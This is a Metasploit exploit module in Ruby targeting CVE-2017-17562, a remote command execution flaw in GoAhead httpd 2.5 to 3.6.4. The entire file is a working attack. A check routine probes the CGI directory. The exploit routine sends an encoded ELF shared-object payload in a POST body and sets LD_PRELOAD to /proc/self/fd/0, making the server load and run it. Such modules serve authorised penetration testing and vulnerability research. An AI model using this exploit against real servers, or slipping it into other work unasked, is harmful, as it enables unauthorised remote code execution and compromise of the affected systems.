##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'GoAhead ld_preload Command Execution',
      'Description'    => %q{
        This module exploits a command execution vulnerability in GoAhead httpd
        server from 2.5 to 3.6.4.
        The server contains a vulnerability where ld_preload can be included in
        a cgi-bin call, and interpreted by the server to load a .so file.
        Only X64 payloads were verified.
      },
      'License'        => MSF_LICENSE,
      'Privileged'     => true,
      'Platform'       => 'linux',
      'Author'         =>
        [
          'Daniel Hodson ', # Discovery
          'h00die', # exploit
        ],
      'References'     =>
        [
          ['CVE', '2017-17562'],
          ['EDB', '43360'],
          ['URL', 'https://www.elttam.com.au/blog/goahead/']
        ],
      'Targets'        =>
        [
          ['X64: 2.5 - 3.6.4 ', { 'Arch' => ARCH_X64 }],
          ['X86: 2.5 - 3.6.4 ', { 'Arch' => ARCH_X86 }],
          ['ARM (LE): 2.5 - 3.6.4 ', { 'Arch' => ARCH_ARMLE }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Dec 18 2017'
    ))

    register_options([
      OptString.new('CGIDIR', [true, 'CGI directory', '/cgi-bin/']),
      OptString.new('CGINAME', [true, 'CGI file', 'cgitest']),
    ],)
  end

  def check
    begin
      url = normalize_uri(datastore['CGIDIR'], Rex::Text.rand_text_alphanumeric(40))
      vprint_status("Validating CGI is enabled against URI: #{url}")
      res = send_request_cgi({
        'uri'    => url,
        'method' => 'GET',
      }, 25)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      vprint_error('Connection failed')
      return Exploit::CheckCode::Unknown
    end
    if res and res.code == 200 and res.body =~ /CGI process file does not exist/
      print_good('CGI is enabled, manual verification of version and valid CGI file required.')
      return Exploit::CheckCode::Detected
    else
      print_status('Newer GoAhead server, or not vulnerable.')
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_status("Sending Exploit to #{datastore['CGIDIR']}#{datastore['CGINAME']}")
    begin
      res = send_request_cgi({
        'uri'    => normalize_uri(datastore['CGIDIR'], datastore['CGINAME']),
        'method' => 'POST',
        # elf-so method taken from #8450
        'data'   => Msf::Util::EXE.to_executable_fmt(framework, target.arch, target.platform,
                      payload.encoded, "elf-so", {:arch => target.arch, :platform => target.platform}),
        'vars_get' =>
          {
            'LD_PRELOAD' => '/proc/self/fd/0'
          }
      }, 25)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error('Connection failed')
    end
    if res and res.code == 404
      print_error('404 error received, verify location of cgi script')
    end
  end
end
